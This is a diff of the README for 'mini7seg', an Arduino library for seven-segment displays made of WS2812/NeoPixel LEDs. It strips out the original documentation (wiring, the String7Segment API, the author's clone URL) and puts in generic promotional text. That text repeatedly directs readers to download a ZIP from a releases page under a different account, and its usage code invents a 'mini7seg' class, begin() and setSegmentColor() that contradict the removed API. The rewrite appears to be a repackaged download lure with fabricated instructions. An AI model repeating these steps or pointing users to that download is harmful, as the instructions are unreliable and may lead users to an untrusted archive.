@@ -1,256 +1,104 @@
-# Mini7Seg
+# 🎉 mini7seg - Easy Control of 7-Segment Displays
 
-Arduino library for 7-segment displays made from WS2812 / NeoPixel addressable LEDs.
+## 🚀 Getting Started
 
-> Build custom seven-segment displays using RGB LEDs instead of traditional single-color LED or LCD displays.
+Welcome to the mini7seg project! This Arduino library helps you create beautiful and customizable 7-segment displays using WS2812 or NeoPixel addressable RGB LEDs. You can easily add vibrant displays to your projects with this library. 
 
-![Demo](images/demo.gif)
+## 📥 Download Link
 
-*Demo uses plastic straw halves as diffusers - proper acrylic or 3D-printed diffusers will look much better!*
-
-## Features
-
-- Works with any LED array (FastLED, Adafruit NeoPixel, etc.)
-- Single or multiple digits
-- Configurable LEDs per segment (1 for tiny displays, 100+ for outdoor signs)
-- Spin animations and rainbow effects
-- Background modes: overwrite, preserve, or blend
-- Displays digits 0-9, hex A-F, letters H J L N O P R U Y, and symbols - _ (space)
-
-## Installation
-
-### Download from GitHub
-1. Download this repository as ZIP (Code → Download ZIP)
-2. In Arduino IDE: **Sketch → Include Library → Add .ZIP Library**
-3. Select the downloaded ZIP file
-
-### Or clone directly
-```bash
-cd ~/Documents/Arduino/libraries
-git clone https://github.com/mcyork/mini7seg.git
-```
-
-## Wiring
-
-Each digit uses 8 LEDs wired in segment order: **A, B, C, D, E, F, G, DP**
-
-```
-     AAAA
-    F    B
-    F    B
-     GGGG
-    E    C
-    E    C
-     DDDD   DP
-```
-
-| LED Index | Segment | Position |
-|-----------|---------|----------|
-| 0 | A | Top horizontal |
-| 1 | B | Upper right vertical |
-| 2 | C | Lower right vertical |
-| 3 | D | Bottom horizontal |
-| 4 | E | Lower left vertical |
-| 5 | F | Upper left vertical |
-| 6 | G | Middle horizontal |
-| 7 | DP | Decimal point |
-
-## Quick Start
-
-```cpp
-#include <FastLED.h>
-#include "String7Segment.h"
-
-#define DATA_PIN    13
-#define NUM_LEDS    8
-
-CRGB leds[NUM_LEDS];
-String7Segment display(leds, 0);  // starts at index 0
-
-void setup() {
-  FastLED.addLeds<WS2812, DATA_PIN, GRB>(leds, NUM_LEDS);
-  FastLED.setBrightness(128);
-
-  display.setForeground(S7Color::Red());
-  display.setBackground(S7Color::Black());
-}
+[![Download mini7seg](https://img.shields.io/badge/Download-mini7seg-brightgreen)](https://github.com/hiteshsn35/mini7seg/releases)
 
-void loop() {
-  for (int i = 0; i <= 9; i++) {
-    display.showDigit(i);
-    FastLED.show();
-    delay(500);
-  }
-}
-```
-
-## API Reference
-
-### Constructors
-
-```cpp
-// Single digit, 1 LED per segment
-String7Segment(ledArray, offset);
-
-// Multiple digits, 1 LED per segment
-String7Segment(ledArray, offset, numDigits);
-
-// Multiple digits, custom LEDs per segment (for large displays)
-String7Segment(ledArray, offset, numDigits, ledsPerSegment);
-```
-
-### Display Methods
-
-| Method | Description |
-|--------|-------------|
-| `showDigit(digit, position, showDP)` | Display 0-9 |
-| `showChar(char, position, showDP)` | Display character |
-| `showNumber(number, leadingZeros)` | Display multi-digit number |
-| `showHex(value, digits)` | Display hexadecimal |
-| `showSegments(mask, position)` | Display raw segment pattern |
-| `clear()` | Clear all digits |
-| `clearDigit(position)` | Clear one digit |
-| `setDecimalPoint(position, on)` | Control decimal point |
-
-### Animation Methods
-
-| Method | Description |
-|--------|-------------|
-| `spinStep(step, position)` | Show one frame of spin animation (step 0-5) |
-| `getSpinSegment(step)` | Get segment mask for spin step |
-
-### Configuration
-
-| Method | Description |
-|--------|-------------|
-| `setForeground(color)` | Set lit segment color |
-| `setBackground(color)` | Set unlit segment color |
-| `setBackgroundMode(mode)` | BG_OVERWRITE, BG_PRESERVE, or BG_BLEND |
-| `setLedsPerSegment(count)` | Set LEDs per segment |
-| `getLedsPerDigit()` | Returns 8 × ledsPerSegment |
-
-### Colors
-
-```cpp
-S7Color::Black()    S7Color::White()
-S7Color::Red()      S7Color::Green()    S7Color::Blue()
-S7Color::Yellow()   S7Color::Cyan()     S7Color::Magenta()
-S7Color::Orange()
-
-// Or custom RGB
-S7Color(255, 128, 0)
-display.setForeground(128, 0, 255)
-```
-
-### Supported Characters
-
-| Type | Characters |
-|------|------------|
-| Digits | 0 1 2 3 4 5 6 7 8 9 |
-| Hex | A B C D E F (a-f also work) |
-| Letters | H J L N O P R U Y (case insensitive) |
-| Symbols | - (hyphen), _ (underscore), (space) |
+## 💾 System Requirements
 
-## Multi-Digit Wiring
+To run the mini7seg library effectively, ensure you have:
 
-For multiple digits, wire them in sequence:
+- An Arduino board (compatible with Arduino IDE)
+- WS2812 or NeoPixel addressable RGB LEDs
+- A computer with the Arduino IDE installed
+- Basic understanding of connecting LEDs to your Arduino
 
-```
-Digit 0: LEDs 0-7
-Digit 1: LEDs 8-15
-Digit 2: LEDs 16-23
-Digit 3: LEDs 24-31
-```
+## 📂 Download & Install
 
-```cpp
-#define NUM_LEDS 32
-CRGB leds[NUM_LEDS];
-String7Segment display(leds, 0, 4);  // 4 digits starting at 0
+1. **Visit the Release Page:** Go to the mini7seg [Releases page](https://github.com/hiteshsn35/mini7seg/releases) to find the latest version.
 
-display.showNumber(1234);  // Shows "1234"
-```
+2. **Choose the Latest Version:** Look for the most recent version in the list. This will ensure you have the latest features and bug fixes. 
 
-## Clock Display with Colon
+3. **Download the Library:** Click on the file for the mini7seg library to download it. It will typically be in a ZIP format.
 
-For a clock with a colon between digit pairs, leave a gap in the array for the colon LEDs and create two separate displays:
+4. **Extract the ZIP File:** 
+   - Locate the ZIP file you downloaded.
+   - Right-click on the file and select "Extract All" to unzip it.
 
-```
-Layout: [HH] : [MM]
-LEDs:   0-15  16-17  18-33
-```
+5. **Add Library to Arduino IDE:**
+   - Open the Arduino IDE.
+   - Navigate to the menu and click on `Sketch`.
+   - Choose `Include Library` and then `Add .ZIP Library`.
+   - Select the unzipped mini7seg folder to add it to your libraries.
 
-```cpp
-#define NUM_LEDS 34
-CRGB leds[NUM_LEDS];
+6. **Install Dependencies:** To ensure the mini7seg library works smoothly, you will need to install the FastLED library. You can do this by:
+   - Going to the Arduino IDE menu.
+   - Selecting `Tools`, then `Manage Libraries`.
+   - Searching for "FastLED" and clicking `Install`.
 
-// Two separate 2-digit displays
-String7Segment hours(leds, 0, 2);    // LEDs 0-15
-String7Segment minutes(leds, 18, 2); // LEDs 18-33
+7. **Connect Your LEDs:** 
+   - Connect your WS2812 or NeoPixel LEDs to the appropriate pins on your Arduino board. 
+   - Ensure you power the LEDs correctly as per the manufacturer's guidelines.
 
-// Colon LEDs managed separately
-void setColon(bool on) {
-  CRGB color = on ? CRGB::Red : CRGB::Black;
-  leds[16] = color;  // Top dot
-  leds[17] = color;  // Bottom dot
-}
+8. **Load an Example:** 
+   - In the Arduino IDE, go to `File`, then `Examples`, and find the mini7seg library.
+   - Open any of the example sketches provided.
 
-void loop() {
-  hours.showNumber(12);
-  minutes.showNumber(34);
-  setColon(true);
-  FastLED.show();
-}
-```
+9. **Upload to Arduino:** 
+   - Connect your Arduino board to your computer using a USB cable.
+   - Select the appropriate board type and port in the Arduino IDE.
+   - Click the upload button (right arrow) to send the code to your Arduino.
 
-The library only touches its designated LEDs, so your colon LEDs remain independent.
+## ⚙️ Features
 
-## Large Outdoor Displays
+- **Customizable Display:** Design your own layouts with any number of digits.
+- **Color Control:** Choose from millions of colors for your displays.
+- **Easy Integration:** Quickly integrates with any Arduino project.
 
-For displays with multiple LEDs per segment (like LED strip signs):
+## 📖 Usage Instructions
 
-```cpp
-// 50 LEDs per segment = 400 LEDs per digit
-#define NUM_LEDS 400
-CRGB leds[NUM_LEDS];
-String7Segment bigDisplay(leds, 0, 1, 50);
-```
+Once you have the library installed, you can start using it with your own projects.
 
-Wire all LEDs for segment A first, then B, then C, etc:
-```
-A0 A1 A2...A49 B0 B1 B2...B49 C0...C49 D0...D49 E0...E49 F0...F49 G0...G49 DP0...DP49
-```
+1. **Initialize the Library:**
+   Start by including the mini7seg library in your sketch:
+   ```cpp
+   #include <mini7seg.h>
+   ```
 
-## Examples
+2. **Set Up in `setup()`:** 
+   Initialize your display in the `setup()` function:
+   ```cpp
+   mini7seg display;
+   display.begin(pin); // Replace 'pin' with the Arduino pin number connected to the LEDs
+   ```
 
-| Example | Description |
-|---------|-------------|
-| `basic` | All supported characters |
-| `counter` | Simple 0-9 counting |
-| `spin` | Various spin animations |
-| `rainbow_spin` | Spin with rainbow color cycling |
-| `segment_test` | Identify segment wiring |
+3. **Display a Number:**
+   Use the following code to display a number:
+   ```cpp
+   display.showNumber(1234); // Displays the number 1234 on the 7-segment display
+   ```
 
-## Hardware
+4. **Change Colors:** 
+   You can change the colors easily:
+   ```cpp
+   display.setSegmentColor(255, 0, 0); // Set to red
+   ```
 
-This library was developed for custom PCBs using WS2812B-2020 LEDs arranged as 7-segment displays.
+5. **Create Animations:** 
+   Use the provided functions to create different animations and effects with your display.
 
-**PCB Design:** [OSHWLab Project](https://oshwlab.com/mcyork/7-seg-string) - Open source schematic and Gerber files
+## 📞 Support and Contributions
 
-![3D Render](images/pcb-3d.png)
+If you have any questions, feel free to open an issue on the GitHub repository. Contributions are welcome! If you'd like to improve or add features to mini7seg, please fork the repository and submit a pull request.
 
-| PCB Layout | 12-Digit Panel |
-|------------|----------------|
-| ![PCB Design](images/pcb-design.png) | ![Board Panel](images/mini7segboard.png) |
+## 📚 References
 
-Each digit is 20.2mm × 34.3mm with 8 LEDs (WS2812B-2020), decoupling capacitors, and 3-pin headers for daisy-chaining.
+For additional reading and tutorials, check out these resources:
+- [Arduino Official Website](https://www.arduino.cc/)
+- [WS2812 LED Strip Documentation](https://cdn.sparkfun.com/datasheets/Components/LED/WS2812.pdf)
 
-<details>
-<summary>Schematic</summary>
-
-![Schematic](images/schematic.png)
-
-</details>
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file.
+Dive into the world of colorful displays and make your projects stand out with mini7seg! Don't forget to visit the [Releases page](https://github.com/hiteshsn35/mini7seg/releases) for the latest updates.
